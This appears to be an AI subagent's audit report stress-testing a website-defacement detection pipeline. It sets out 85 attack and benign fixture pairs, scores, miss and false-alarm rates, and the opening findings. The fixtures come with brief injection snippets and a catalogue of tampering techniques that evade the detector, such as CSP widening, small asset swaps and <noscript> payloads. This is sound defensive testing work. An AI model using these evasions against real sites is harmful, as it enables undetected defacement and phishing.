### [DONE] PROMPT-003 Audit Phase 8 — Adversarial Detection Accuracy Stress Test

- **Prompt**: SESSION-B-KICKOFF.md (subagent W1-B)
- **Session date**: 2026-09-30
- **Assigned subsystem**: all nine detection layers + fusion, **as deployed** (`worker/detection/pipeline.run_detection`, the committed `training/fusion_model.json`, the committed `training/{fusion_dataset,regression_corpus}.json`), plus the `worker/scan_tasks.py` verdict/escalation arithmetic and `worker/hashing.py`'s layer-1 gate.
- **Method**
  1. **Fixture construction** — 85 hermetic attack/benign **pairs** generated programmatically over shape parameters (`%TEMP%\opencode\wardress-session-b-detection\fixtures.py`), against a realistic 14-article merchant/editorial baseline (nav, footer, inline `<style>`, a same-origin login form, one known-vendor script). No network.
  2. **Screenshots are real.** Every fixture side was rendered by **Chromium 149 (Playwright)** at a 1366-px viewport, full-page, against a loopback HTTP origin with every non-loopback request aborted. A dedicated three-pass render implements a genuine **server-side asset swap** (the same URL serving *different bytes* between the two renders) — the only truthful model of taxonomy techniques #2 and #8, where the DOM is byte-identical. A 12-glyph-pair outline-swapped TTF (built with fontTools from `georgia.ttf`) and a legitimate second webfont (`verdana.ttf`) implement the `@font-face` pair. The runner **hard-fails** if any screenshot is missing, because a fixture whose layer 4 reads `degraded` would silently mis-state every fused number (this caught a real batch-render bug mid-phase; the affected fixtures were re-rendered and the whole suite re-run).
  3. **Digest discipline** — `content_hash = worker.hashing.content_sha256(html)` on both sides, exactly as `scan_tasks.py:136/290` does. No manufactured misses through a stale or wrong digest. 17 fixtures are byte-identical by construction and correctly read `layer1_hash = 0.0` with layers 2/3/5/8 `skipped`; they exist to make the layer-4-only channel measurable.
  4. **Verdict arithmetic reproduced in-process** — `risk`, `changed` (`any non-skipped layer > NOISE_FLOOR 0.02`), `flagged` (`risk >= site.flag_threshold`, default **0.50**), `material` (`risk >= MATERIAL_CHANGE_RISK 0.40`), `escalate` (`not flagged and changed and 0.40 <= risk < 0.75`) — mirroring `scan_tasks.py:300-327` and `llm_escalation.should_escalate`.
  5. **Rule 18** — every fixture ran **3 passes** through the deployed pipeline in one long-lived process (model loaded once). **Every fused-risk pstdev over the whole 85-fixture suite is exactly 0.000000 and every per-layer pstdev is 0.0**: the pipeline is a pure function of its inputs, so the repeatability requirement is met with zero variance. The two multi-render fixtures were additionally rendered 4× per side and paired 4 ways.
  6. **Auxiliary probes** (same process): layer-4 **area-sensitivity sweep** (9 area points composited onto the real render), ReDoS against the **suppression path** (8 patterns × 3 arms × 3 passes, plus an isolated armed-asymmetry arm), re-fusion of **both committed artifacts** through the deployed `layer9_fusion`, a **layer-1 gate-collision search** (10 candidate shapes), and an 11-shape **benign churn band** with real screenshots.

- **Fixture inventory**

| class | n | contents |
|---|---|---|
| **Positive controls** | 2 | byte-identical pair; static page rendered 4× per side (render-noise floor) |
| **Attack-control** (must catch) | 6 | attack-withdrawn; precise/over-broad suppression arms; no-op suppression selector; pre-compromised-static |
| **Attack — Phase-2 taxonomy** | 22 | all **10** techniques: T1 defacement, T2 asset swap, T3 SEO-spam farm, T4 script injection, T5/T5b non-Latin rewrite/inject, T6/T6b phishing overlay, T7/T7b/T7c single-word tampering, T8 image-only tamper, T9/T9b/T9c redirect cloaking, T10/T10b delayed payloads |
| **Attack — visual-only (NB-DET-1, mandatory)** | 6 | V1 style-invert, V1b CSS overlay (zero text), V1c CSS overlay with text, V2 `@font-face` glyph hijack, V3 canvas takeover, V3b SVG rect-geometry takeover |
| **Benign — visual twins** | 5 | VB1 hue refresh, VB1b full rebrand, **VB2 legit webfont swap**, VB3 responsive breakpoint restyle, VB4 logo swap, VB5 font-stack change |
| **Benign — Session A backlog** | 6 | B1/B1b/B1c/B1d widget appears/rotates/same-domain control, B2/B2b vendor scripts, B3/B3b redesign, B4/B4b stylesheets, B5 sanity-quiet, B6 A/B swap |
| **Attack — Session A backlog** | 12 | BA7/BA7b/BA7c CSP widenings, BA8 HSTS downgrade, BA10 × 3 cloaking sizes, BA11 × 3 un-hiding, BA12 × 2 removal-only, BA13/BA13b lexicon controls |
| **Suppression-as-adversary** | 8 | S3a–S3h: guessed selectors (`#banner`, `[role=alert]`, `aside`), over-broad rules (`main`, `[\s\S]+`), a **bbox** arm, and a **bbox + selector** arm |
| **Attack — novel evasion (Rule 17)** | 14 | E1 `<base href>` hijack, E2 event-handler injection, E3 `content:attr()`, E4 `content:'…'`, E5 `<noscript>`, E6 `srcdoc` iframe, E7 churn-padded attack, E8 pre-compromise rotation, E9 tooltip attribute, E11 CSS-hidden form swap, E12 `<meta http-equiv>` CSP, E13/E14 hidden-text reveal, S4 total content takeover |
| **Benign — novel** | 3 | E10 churn padding control, E15 DOM re-serialisation, S1 interactive-page render noise (4 render pairs) |
| **Total** | **85** | 57 attack, 21 benign, 7 control |

- **Result headline:** **all three mandated visual-only attacks are caught** (0.9979 / 0.9998 / 1.0000) because the capture→screenshot path does deliver a usable image and layer 4 does receive it. **The benign webfont-swap twin flags at 0.9995 — louder than the glyph hijack it is paired with.** Across the suite: **22 of 57 attack fixtures (38.6%) sit below the 0.40 material bar**, 3 read `clean`; **13 of 21 benign fixtures (61.9%) cross 0.40 and 12 of 21 (57.1%) raise an alert**; **1 benign fixture burns an LLM escalation call per scan**.

---

## 1. Dense results table

All values are the mean of 3 passes; **every pstdev is 0.000000**, so the variance column is `0` throughout and is stated once. `-` = layer `skipped` (gated by the identical-hash proof), `deg` = layer `degraded`. `Bar hit` = which operational bar the fixture crosses.

### 1.1 Positive and attack controls (must catch)

| Fixture | Class | P1 | P2 | P3 | Variance | Fused risk | Verdict | Bar hit | Disposition |
|---|---|---|---|---|---|---|---|---|---|
| `P0_identical` byte-identical pair | control | 0.0019 | 0.0019 | 0.0019 | 0 | 0.0019 | `clean` | none | **PASS** — harness floor is correct |
| `P1_static_render_noise` #0-#3, 4 cross pairs | control | 0.0019 ×4 | | | 0 | 0.0019 | `clean` | none | **PASS** — re-confirms Session A's layer-4 render-noise result |
| `T1_defacement_banner` HTML text banner | control | 1.0000 | 1.0000 | 1.0000 | 0 | **1.0000** | `flagged` | all | **PASS** (L5=1.0, floor `conclusive_signature_text`) |
| `BA18_attack_withdrawn` banner in baseline, gone in scan | control | 0.7078 | 0.7078 | 0.7078 | 0 | **0.7078** | `flagged` | all | **PASS** — carried **entirely by L4=0.1031** (L5=L8=0.0). Backlog item 18 confirmed and now guarded |
| `S3c_suppress_aside` attack + a **no-op** selector | control | 1.0000 | 1.0000 | 1.0000 | 0 | 1.0000 | `flagged` | all | **PASS** |
| `S3f_suppress_precise` attack + a precise regex | control | 1.0000 | 1.0000 | 1.0000 | 0 | 1.0000 | `flagged` | all | **PASS** |
| `S3g_suppress_bbox_overlay` attack + bbox top 30% only | control | 1.0000 | 1.0000 | 1.0000 | 0 | 1.0000 | `flagged` | all | **PASS** — a bbox rule alone does not blind layer 5/8 |
| `E8b_precompiled_static` compromised site, identical payload | control | 0.0019 | 0.0019 | 0.0019 | 0 | 0.0019 | `clean` | none | **PASS** by design — documents the pre-compromise blind spot |
| `BA13b_punctuated_control` punctuated page + lexicon + 1 edit | control | 0.8370 | 0.8370 | 0.8370 | 0 | **0.8370** | `flagged` | all | see AUDIT-8-6 |

### 1.2 Attacks — CAUGHT (34 of 57, ≥ 0.50)

| Fixture | Class | P1 | P2 | P3 | Var | Fused risk | Verdict | Bar hit | Disposition |
|---|---|---|---|---|---|---|---|---|---|
| `T1_defacement_banner` | attack | 1.0000 | = | = | 0 | 1.0000 | `flagged` | all | Fix-candidate: none (works) |
| `T3_seo_spam_farm` | attack | 0.7064 | = | = | 0 | 0.7064 | `flagged` | all | PASS (floor `new_sensitive_infrastructure`) |
| `T4_script_injection` | attack | 0.5635 | = | = | 0 | 0.5635 | `flagged` | all | PASS |
| `T5_nonnative_full_rewrite` zh | attack | 0.9979 | = | = | 0 | 0.9979 | `flagged` | all | PASS (L8=0.6604) |
| `T5b_nonnative_partial_inject` ru | attack | 0.9864 | = | = | 0 | 0.9864 | `flagged` | all | PASS (L8=0.7769) |
| `T6_phish_overlay_newdomain` | attack | 0.9998 | = | = | 0 | 0.9998 | `flagged` | all | PASS |
| `T6b_phish_overlay_sameorigin` | attack | 0.9993 | = | = | 0 | 0.9993 | `flagged` | all | PASS — **refutes AUDIT-2-2**: with screenshots the same-origin overlay *is* caught (by L4=0.3420) |
| `T7_singleword_tamper` two weeks→two days | attack | 0.6718 | = | = | 0 | 0.6718 | `flagged` | all | PASS — **refutes the "genuinely absent" claim** (AUDIT-2-2) |
| `T7b_singleword_legal` refund 30→90 days | attack | 0.6723 | = | = | 0 | 0.6723 | `flagged` | all | PASS (same channel) |
| `T9_meta_refresh_cloak` | attack | 1.0000 | = | = | 0 | 1.0000 | `flagged` | all | PASS — **but only because the 0s-second meta-refresh fires during the capture** (L4=0.5610) |
| `T9b_location_replace_cloak` | attack | 1.0000 | = | = | 0 | 1.0000 | `flagged` | all | PASS (same reason) |
| `T9c_meta_refresh_novariant` L7 degraded | attack | 1.0000 | = | = | 0 | 1.0000 | `flagged` | all | PASS with layer 7 fully dark |
| `T10_delayed_dom_text` | attack | 1.0000 | = | = | 0 | 1.0000 | `flagged` | all | PASS |
| `T2b_asset_swap_fullbleed` identical DOM, full-bleed swap | attack | 0.9889 | = | = | 0 | 0.9889 | `flagged` | all | PASS (L4=0.4090) — **the scale control for T2/T8** |
| `S3a_suppress_exact_selector` defacement inside `#banner` | attack | 0.7044 | = | = | 0 | 0.7044 | `flagged` | all | PASS — **material correction to AUDIT-4-4's High half** |
| `S3b_suppress_role_alert` | attack | 0.7044 | = | = | 0 | 0.7044 | `flagged` | all | PASS, same |
| `BA11b_unhide_spam_farm_real` hidden farm revealed | attack | 0.5422 | = | = | 0 | 0.5422 | `flagged` | all | PASS, but **for the wrong reason** (L3 saw 8 new domains) — see AUDIT-8-5 |
| `BA13_unpunctuated_lexicon` | attack | 0.9999 | = | = | 0 | 0.9999 | `flagged` | all | PASS as a defacement; **FP as a benign edit** — see AUDIT-8-6 |
| `E11_css_hidden_form_swap` real form hidden, harvester shown | attack | 0.7801 | = | = | 0 | 0.7801 | `flagged` | all | PASS |
| `E3_css_attr_content` visible text with no text node | attack | 0.9984 | = | = | 0 | 0.9984 | `flagged` | all | PASS (L4=0.3150) — layers 5/8 are blind to it, L4 carries |
| `E4_css_content_string` | attack | 0.9999 | = | = | 0 | 0.9999 | `flagged` | all | PASS (L4=0.4372) |
| `E6_srcdoc_iframe` full-page `srcdoc` takeover | attack | 1.0000 | = | = | 0 | 1.0000 | `flagged` | all | PASS |
| `E7_attack_with_churn_padding` defacement + 40 articles | attack | 1.0000 | = | = | 0 | 1.0000 | `flagged` | all | PASS — **padding does not dilute** (floors + L5=1.0) |
| `E8_precompiled_rotate` compromised before onboarding, crew rotates | attack | 1.0000 | = | = | 0 | 1.0000 | `flagged` | all | PASS |
| `S4_layer8_total_takeover` every word replaced | attack | 1.0000 | = | = | 0 | 1.0000 | `flagged` | all | PASS **only via L4=0.6328**; L2=0.0000, L8=0.9655 → 1.0 only through the 26.26 coefficient |
| V1/V1b/V1c/V2/V3/V3b (6 visual-only) | attack | 0.9979-1.0000 | = | = | 0 | see §2 | `flagged` | all | PASS — the mandated centrepiece |

### 1.3 Attacks — MISSES (23 of 57)

Detailed `### MISS` blocks follow in §4.

| Fixture | Class | P1 | P2 | P3 | Var | Fused risk | Verdict | Bar hit | Disposition |
|---|---|---|---|---|---|---|---|---|---|
| `BA7_csp_widen_star` `'self'`→`*` | attack | 0.0019 | = | = | 0 | **0.0019** | **`clean`** | **none** | Fix-candidate — AUDIT-8-1 |
| `BA7b_csp_unsafe_inline` | attack | 0.0019 | = | = | 0 | **0.0019** | **`clean`** | **none** | Fix-candidate — AUDIT-8-1 |
| `BA7c_csp_attacker_origin` exfil origin added | attack | 0.0019 | = | = | 0 | **0.0019** | **`clean`** | **none** | Fix-candidate — AUDIT-8-1 (FP direction) |
| `BA8_hsts_max_downgrade` 2y+preload→300s | attack | 0.0025 | = | = | 0 | 0.0025 | `changed` | none | Fix-candidate — AUDIT-8-2 |
| `T2_asset_swap_dom_identical` identical DOM, 320×120 swap | attack | 0.0043 | = | = | 0 | 0.0043 | `changed` | none | Fix-candidate — AUDIT-8-3 |
| `T8_image_only_tamper` identical DOM, 640×300 swap | attack | 0.0244 | = | = | 0 | 0.0244 | `changed` | none | Fix-candidate — AUDIT-8-3 |
| `BA10_partial_cloak_small` ~60 ref tokens | attack | 0.0105 | = | = | 0 | 0.0105 | `changed` | none | Fix-candidate — AUDIT-8-4 |
| `BA10_partial_cloak_medium` ~400 | attack | 0.0075 | = | = | 0 | 0.0075 | `changed` | none | Fix-candidate — AUDIT-8-4 |
| `BA10_partial_cloak_large` ~1400 | attack | 0.0075 | = | = | 0 | 0.0075 | `changed` | none | Fix-candidate — AUDIT-8-4 |
| `BA11c_unhide_internal_farm` **isolated** un-hiding | attack | 0.1372 | = | = | 0 | 0.1372 | `changed` | none | Fix-candidate — AUDIT-8-5 |
| `BA12_removal_only_deface` strip form + analytics | attack | 0.1453 | = | = | 0 | 0.1453 | `changed` | none | Fix-candidate — AUDIT-8-7 |
| `BA12b_removal_only_iframe` strip the site's own iframe | attack | 0.1392 | = | = | 0 | 0.1392 | `changed` | none | Fix-candidate — AUDIT-8-7 |
| `E13_hidden_text_revealed` cloaked spam text made visible | attack | 0.1372 | = | = | 0 | 0.1372 | `changed` | none | Fix-candidate — AUDIT-8-5 |
| `E14_hidden_defacement_revealed` conclusive payload revealed | attack | 0.1372 | = | = | 0 | 0.1372 | `changed` | none | Fix-candidate — AUDIT-8-5 |
| `E1_base_href_hijack` every relative URL re-pointed | attack | 0.1392 | = | = | 0 | 0.1392 | `changed` | none | Fix-candidate — AUDIT-8-8 |
| `E12_meta_csp_weaken` `<meta http-equiv>` CSP | attack | 0.1392 | = | = | 0 | 0.1392 | `changed` | none | Fix-candidate — AUDIT-8-1 |
| `E5_noscript_payload` full-viewport defacement in `<noscript>` | attack | 0.1411 | = | = | 0 | 0.1411 | `changed` | none | Fix-candidate — AUDIT-8-9 |
| `E9_title_attr_deface` payload in a `title=` tooltip | attack | 0.1372 | = | = | 0 | 0.1372 | `changed` | none | Fix-candidate (Low) — AUDIT-8-9 |
| `T7c_singleword_price` `two days`→`some time` | attack | 0.1372 | = | = | 0 | 0.1372 | `changed` | none | Fix-candidate — AUDIT-8-3 |
| `T10b_delayed_script_string` payload in a timed `<script>` | attack | 0.2330 | = | = | 0 | 0.2330 | `changed` | none | Fix-candidate — AUDIT-8-10 |
| `BA11_unhide_..._hidden2hidden` control | attack | 0.2350 | = | = | 0 | 0.2350 | `changed` | none | control (passes) |
| `E2_event_handler_injection` `onerror=` + same-origin `src` | attack | 0.4975 | = | = | 0 | 0.4975 | `changed` | **0.40 only** | Fix-candidate — AUDIT-8-8 (the worst case in the suite: escalation burn + cadence pin, no alert) |
| `S3h_suppress_bbox_and_selector` defacement + `#banner` + bbox | attack | 0.1372 | = | = | 0 | 0.1372 | `changed` | none | Fix-candidate — **AUDIT-8-11 (worst overall)** |

### 1.4 Benign — FALSE POSITIVES (13 of 21 cross 0.40; 12 alert)

| Fixture | Class | P1 | P2 | P3 | Var | Fused risk | Verdict | Bar hit | Disposition |
|---|---|---|---|---|---|---|---|---|---|
| `VB3_breakpoint_restyle` 1366→820, identical HTML | benign | 1.0000 | = | = | 0 | **1.0000** | **`flagged`** | all | Fix-candidate — **AUDIT-8-12** |
| `B3_site_redesign` grid layout + new theme sheet | benign | 1.0000 | = | = | 0 | **1.0000** | **`flagged`** | all | Fix-candidate — AUDIT-8-13 |
| `B3b_site_redesign_bigger` + vendor script | benign | 1.0000 | = | = | 0 | **1.0000** | **`flagged`** | all | Fix-candidate — AUDIT-8-13 |
| `VB2_webfont_swap` **legit webfont change** | benign | 0.9995 | = | = | 0 | **0.9995** | **`flagged`** | all | Fix-candidate — **AUDIT-8-14 (hard twin of V2)** |
| `E10_churn_padding_only` 40 benign articles | benign | 0.9981 | = | = | 0 | **0.9981** | **`flagged`** | all | Fix-candidate — AUDIT-8-13 |
| `B6_ab_variant_swap` A/B hero copy change | benign | 0.9975 | = | = | 0 | **0.9975** | **`flagged`** | all | Fix-candidate — AUDIT-8-13 |
| `B1_widget_appears` Google reCAPTCHA added | benign | 0.8537 | = | = | 0 | **0.8537** | **`flagged`** | all | Fix-candidate — AUDIT-8-15 (confirms AUDIT-SA2-1) |
| `B1b_widget_src_rotates` reCAPTCHA `src` rotates | benign | 0.8537 | = | = | 0 | **0.8537** | **`flagged`** | all | Fix-candidate — AUDIT-8-15 |
| `B2b_vendor_2_scripts` two vendor scripts | benign | 0.7622 | = | = | 0 | **0.7622** | **`flagged`** | all | Fix-candidate — AUDIT-8-15 |
| `B1d_turnstile` Cloudflare Turnstile added | benign | 0.5635 | = | = | 0 | **0.5635** | **`flagged`** | all | Fix-candidate — AUDIT-8-15 |
| `B2_vendor_script_added` one vendor script | benign | 0.5635 | = | = | 0 | **0.5635** | **`flagged`** | all | Fix-candidate — AUDIT-8-15 |
| `B5_sanity_benign_quiet` one quiet paragraph | benign | 0.5368 | = | = | 0 | **0.5368** | **`flagged`** | all | Fix-candidate — AUDIT-8-13 |
| `B4b_two_new_stylesheets` two webfonts | benign | 0.4511 | = | = | 0 | **0.4511** | `changed` | **0.40-0.75 → LLM** | Fix-candidate — AUDIT-8-15 |
| `B4_one_new_stylesheet` one webfont | benign | 0.3089 | = | = | 0 | 0.3089 | `changed` | none | PASS (below bar) |
| `VB1b_hue_refresh_inline` full rebrand (literal `hsl`) | benign | 0.2276 | = | = | 0 | 0.2276 | `changed` | none | PASS — but only 1.8× under the bar |
| `VB1_hue_refresh` `--brand-h` 210→330 | benign | 0.1921 | = | = | 0 | 0.1921 | `changed` | none | **PASS — resolves Session A backlog row 19** |
| `B1c_widget_same_domain_rotate` **control** | benign | 0.1431 | = | = | 0 | 0.1431 | `changed` | none | PASS (confirms the known-domain carve-out) |
| `E15_dom_reorder_only` attribute/space churn | benign | 0.1372 | = | = | 0 | 0.1372 | `changed` | none | PASS |
| `VB4_logo_swap` legit logo swap | benign | 0.0043 | = | = | 0 | 0.0043 | `changed` | none | PASS (but see AUDIT-8-3: the same value as the attack) |
| `S1_interactive_noise` #0-#3, 4 render pairs | benign | 0.0021-0.0029 | | | 0 | 0.0029 max | `clean` | none | **PASS** — resolves the Session A interactive-page question |
| `VB5_font_family_stack` system font change | benign | 0.0019 | = | = | 0 | 0.0019 | `clean` | none | PASS |
| `VB3b`/`VB1` rows above; `P1_static` in §1.1 | | | | | | | | | |

### 1.5 Rates (Rule 19: no aggregate-only — every case is itemised in §3/§4)

| metric | value | cases |
|---|---|---|
| **Attack false-negative — reads `clean`** | **3 / 57 = 5.3 %** | BA7, BA7b, BA7c (all CSP) |
| **Attack false-negative — below the 0.40 material bar** | **22 / 57 = 38.6 %** | the 22 rows in §1.3 excluding E2 |
| **Attack false-negative — misses the 0.50 flag threshold** | **23 / 57 = 40.4 %** | §1.3 (all 23) |
| **Benign false-positive — reaches 0.40** | **13 / 21 = 61.9 %** | VB3, B3, B3b, VB2, E10, B6, B1, B1b, B2b, B1d, B2, B5, B4b |
| **Benign false-positive — raises an alert (≥ 0.50)** | **12 / 21 = 57.1 %** | the same minus B4b |
| **Escalation-band burn rate on benign churn** | **1 / 21 = 4.8 % of the benign fixtures** — only `B4b` (two new webfonts, 0.4511). Of the 11 out-of-family benign churn shapes re-measured in §5, **0 land in the 0.40-0.75 band**: 10 sit at 0.0019-0.2484, and the single shape ≥ 0.40 (a reCAPTCHA widget at 0.5635) is *above* 0.50, so it alerts outright and is skipped by `should_escalate`'s `not flagged` guard. **Honest read:** the escalation burn is smaller than §3.5's framing implied, but the benign **alert** rate is severe enough that `should_escalate` rarely gets the chance to run — most benign false positives are ≥ 0.75 and bypass the second opinion entirely. | `B4b` |
| **Attack escalation-band entries** | 1 / 57 | E2 (0.4975) |
| Layer-4 availability | **85 / 85 measured, 0 degraded** | the capture path is not the limiting factor for any fixture |
| Layer crashes | **0** across 255 pipeline invocations | |
| Pipeline repeatability | **pstdev 0.000000 on all 85 fixtures** | Rule 18 satisfied |

---

## 2. The three mandated visual-only fixtures (`NB-DET-1`), each with its benign twin

**The empirical crux, resolved first:** *does the capture→screenshot path produce a usable screenshot for these fixtures, and does layer 4 receive it?* **Yes, for all 85 fixtures, without exception.** Layer 4 returned a **measured** (never `degraded`, never `skipped`) real-valued score on every fixture, and the evidence fields (`ssim`, `phash_distance_bits`, `dhash_distance_bits`, `chroma_*_delta_255`, per-side pixel dimensions) are populated on every visual row. Nothing in this section is limited by a dark channel.

### 2.1 `V1_style_invert` — `<style>` injection with visual defacement

| arm | L1 | L2 | L3 | **L4** | L5 | L8 | fused | verdict | LLM |
|---|---|---|---|---|---|---|---|---|---|
| `V1_style_invert` `body{filter:invert(1) hue-rotate(180deg)}` | 1.0 | 0.0129 | 0.0 | **0.4237** | 0.0 | 0.0 | **0.9999** | **`flagged`** | no (> 0.75) |
| `V1b_style_overlay_css_only` full-viewport overlay, **zero text nodes** | 1.0 | 0.0255 | 0.0 | **0.3991** | 0.0 | 0.0 | **0.9998** | **`flagged`** | no |
| `V1c_style_overlay_with_text` overlay **with** text | 1.0 | 0.0255 | 0.0 | **0.3885** | 0.0 | 0.0 | **0.9998** | **`flagged`** | no |
| benign twin `VB1_hue_refresh` `--brand-h` 210→330 | 1.0 | 0.0 | 0.0 | **0.0153** | 0.0 | 0.0 | 0.1921 | `changed` | no |
| benign twin `VB1b_hue_refresh_inline` full rebrand, literal `hsl()` | 1.0 | 0.0 | 0.0 | **0.0235** | 0.0 | 0.0 | 0.2276 | `changed` | no |

Layer-4 evidence: `V1` ssim **0.7590**, pHash **128**/256 bits, dHash **75**/256, chroma-mean Δ **1.42** (SSIM carries it, not chroma — an inversion preserves per-channel means). `V1b`/`V1c` chroma-mean Δ **69.88 / 64.92** (the overlay carries chroma). `VB1` ssim **1.0000**, pHash **4** bits, chroma-mean Δ **1.83** — inside the 2.0-unit deadband on the mean, so only the 0.30-weighted chroma term and a 4-bit hash difference separate it.

**Verdict: CAUGHT, decisively.** 0.9999, 3/3 passes, pstdev 0. The genuinely-abstinent category holds: layers 2/3/5/8 contribute almost nothing (L2 0.0129 from the added `<style>` element, everything else exactly 0.0) and **the 26.26 coefficient on layer 4 is the entire detection**.

**And the benign twin is clean** — 0.1921, 1.8× below the material bar. Session A's backlog row 19 asked for exactly this number and it is now measured: **a real `hsl()` brand refresh on a real Chromium render reads `layer4 = 0.0153` and fuses to 0.1921, `changed`, no alert, no escalation.** Session A's dataset max of 0.0222 and layer-4-alone-at-0.2379 concern are both *not* realised on a real render. The full-rebrand twin (VB1b, four colour rules swapped) is 0.0235 / 0.2276 — still below, but the margin is now 1.8×, not 18×.

### 2.2 `V2_fontface_hijack` — `@font-face` glyph hijacking, and its hard twin `VB2_webfont_swap`

The hijack font is a real TTF: `georgia.ttf` with the glyph **outlines of 12 letter pairs swapped** (`a↔e, i↔l, s↔f, o↔q, n↔u, c↔t, r↔p, d↔b, m↔w, h↔y, v↔x, g↔j`), built with fontTools and served as a real webfont. The DOM text, the DOM structure, the link graph, the content hash, the tag counts, the visible text extraction and every other layer input are **byte-identical**; only the rasterisation differs. The twin loads `verdana.ttf` through the identical `@font-face` mechanism — the **only** difference between the two fixtures is which font file is served.

| arm | L1 | L2 | L3 | **L4** | L5 | L8 | fused | verdict | LLM |
|---|---|---|---|---|---|---|---|---|---|
| `V2_fontface_hijack` **attack** | 1.0 | 0.0129 | 0.0 | **0.3043** | 0.0 | 0.0 | **0.9979** | **`flagged`** | no |
| `VB2_webfont_swap` **benign twin** | 1.0 | 0.0129 | 0.0 | **0.3627** | 0.0 | 0.0 | **0.9995** | **`flagged`** | no |

Layer-4 evidence: hijack ssim **0.6741**, pHash **24**/256, dHash **41**/256, chroma-mean Δ **0.11** (a pure outline swap is luminance-neutral — the chroma channel is structurally blind to it, exactly as predicted). Twin ssim **0.6074**, pHash **32**/256, dHash **43**/256, chroma-mean Δ **0.50**.

**Two results, both reportable, and the pair is the point:**

1. **The attack IS caught** — 0.9979, 3/3 passes, pstdev 0. A pure font swap produces a large SSIM delta (0.6741) because re-typesetting 14 articles of body copy changes glyph advances, line breaks and inter-word spacing throughout. The brief's hypothesis that "a pure font swap may produce a very small SSIM/pHash delta" is **refuted for whole-page font changes**: ssim 0.6741 is a 33 % structural loss, comparable to a full-page colour inversion.
2. **The benign twin flags *harder* than the attack** — 0.9995 vs 0.9979, and layer 4 0.3627 vs 0.3043. **Layer 4 cannot distinguish a glyph hijack from a legitimate webfont swap, and the only thing standing between an operator and a false alert on a routine brand typography change is the 0.0129 of layer-2 tag churn.** This is a false positive on *extremely* common site behaviour (every performance-minded rebrand ships a webfont), so per §6.4 it is **High** — and per the severity rubric it is arguably more operationally damaging than the attack miss it is paired with, because the attack side is already caught. See **AUDIT-8-14**.

### 2.3 `V3_canvas_takeover` / `V3b_svg_geometry_takeover` — graphical takeover with no HTML text

| arm | L1 | L2 | L3 | **L4** | L5 | L8 | fused | verdict |
|---|---|---|---|---|---|---|---|---|
| `V3_canvas_takeover` full-viewport `<canvas>`, message drawn with `fillText` | 1.0 | 0.5034 | 0.0 | **0.4247** | 0.0 | 0.0 | **1.0000** | **`flagged`** |
| `V3b_svg_geometry_takeover` `<svg>` with `<rect>`/`<path>` only — **no text node anywhere in the payload** | 1.0 | 0.2800 | 0.0 | **0.3879** | 0.0 | 0.0 | **0.9998** | **`flagged`** |
| benign twin `VB3_breakpoint_restyle` 1366→820 viewport, **identical HTML** | 0.0 | `-` | `-` | **0.6293** | `-` | `-` | **1.0000** | **`flagged`** |
| benign twin `VB4_logo_swap` legitimate logo asset swap, identical DOM | 0.0 | `-` | `-` | **0.0307** | `-` | `-` | 0.0043 | `changed` |

Layer-4 evidence: canvas ssim **0.7824**, pHash **114**/256, dHash **40**/256, chroma-mean Δ **65.10**. SVG ssim **0.7930**, pHash **106**/256, dHash **34**/256, chroma-mean Δ **49.67**.

**Verdict: CAUGHT.** Both render a full-viewport graphical takeover that `extract_visible_text` cannot see at all — layer 5 and layer 8 are exactly 0.0 — and both flag. This is the cleanest demonstration in the suite that layer 4 is the only channel carrying visual-only attacks, and that it does carry them.

**But the benign twin is louder still.** `VB3` — a legitimate responsive breakpoint change with **byte-identical HTML** (so the hash gate skips layers 2/3/5/8 and layer 4 is the *only* channel by construction) — measures **layer 4 = 0.6293, ssim 0.5220, pHash 106, dHash 132, chroma-mean Δ 7.83** and **flags at 1.0000**. That is a *larger* layer-4 reading than the canvas takeover it is paired against. A site served at a 820-px tablet breakpoint between two scans, or a container-width change that reflows the whole page, raises an alert + a `RemediationExecution`. See **AUDIT-8-12** (High).

**Additional visual-only primitives, all caught** (and none of them modelable by any text channel):

| fixture | primitive | L4 | fused | verdict |
|---|---|---|---|---|
| `E3_css_attr_content` `::after{content:attr(data-x)}` — visible defacement text with **zero text nodes** | 0.3150 | 0.9984 | `flagged` |
| `E4_css_content_string` `::before{content:'HACKED BY DRAGON TEAM'}` | 0.4372 | 0.9999 | `flagged` |
| `E6_srcdoc_iframe` full-viewport `<iframe srcdoc>` — no external ref, no text in the host DOM | 0.4495 | 1.0000 | `flagged` |
| `E5_noscript_payload` full-viewport defacement inside `<noscript>` | **0.0000** | 0.1411 | `changed` — **MISS**, see AUDIT-8-9 |

`E3`/`E4` are the strongest single result in the phase: a defacement banner whose text exists only as a CSS `content` value is invisible to `extract_visible_text`, so layers 5 and 8 read exactly 0.0 — yet the rasterised page is a banner, and layer 4 flags at 0.998. `E5` is the same attack placed where Chromium (JS enabled, as Wardress captures) does not render it: the defacement is real for a JS-disabled visitor and **completely invisible to Wardress's own screenshot**, so the visual backstop that rescues every other visual-only fixture does not exist. That is a real, named gap.

### 2.4 The layer-4 area curve — the quiet root cause behind three different results

Nine overlay heights composited onto the *real* rendered baseline (3103 px page), 3 passes each, pstdev 0:

| overlay height | % of page | **L4** | fused | verdict |
|---|---|---|---|---|
| 3 px | 0.10 % | **0.1514** | 0.0936 | `changed` — **silent** |
| 15 px | 0.50 % | **0.2817** | **0.7593** | `flagged` |
| 31 px | 1.00 % | 0.3389 | 0.9340 | `flagged` |
| 62 px | 2.00 % | 0.3994 | 0.9858 | `flagged` |
| 155 px | 5.00 % | 0.4669 | 0.9976 | `flagged` |
| 310 px | 10.0 % | 0.5818 | 0.9999 | `flagged` |
| 775 px | 25.0 % | 0.6629 | 1.0000 | `flagged` |
| 1551 px | 50.0 % | 0.8171 | 1.0000 | `flagged` |
| 3103 px | 100 % | 1.0000 | 1.0000 | `flagged` |

**The detection cliff is between 0.1 % and 0.5 % of page height.** A 3-pixel full-width strip of attacker-controlled pixels is silent; a 15-pixel one flags at 0.7593. There is no area floor, no tile-entropy term, and no localisation anywhere in `visual.py` — the score is one global SSIM + two whole-image hashes + one global chroma mean, and its sensitivity is set entirely by the *fraction* of the page the change occupies. This one curve explains three otherwise-unrelated results: the caught `T2b` (full-bleed swap, L4 0.4090) versus the missed `T8` (640×300 image, L4 0.0975) and `T2` (320×120 logo, L4 0.0307) with byte-identical HTML and byte-different assets; and it bounds what "asset-swap with an unchanged DOM" means in practice — **the technique is only covered when the swapped asset is large.** See **AUDIT-8-3**.

---

## 3. Findings

### AUDIT-8-1 — A CSP widening is recorded as a *false `clean`*; the direction classifier cannot resolve any real relaxation, and a `<meta http-equiv>` CSP is never read at all
- **Severity**: **Critical** — §6.4's first bullet, a false "clean" on an actual attack pattern. CSP weakening is the standard XSS/defacement prerequisite and is the *only* thing layer 6 exists to detect. Re-confirms and extends AUDIT-SA2-2.
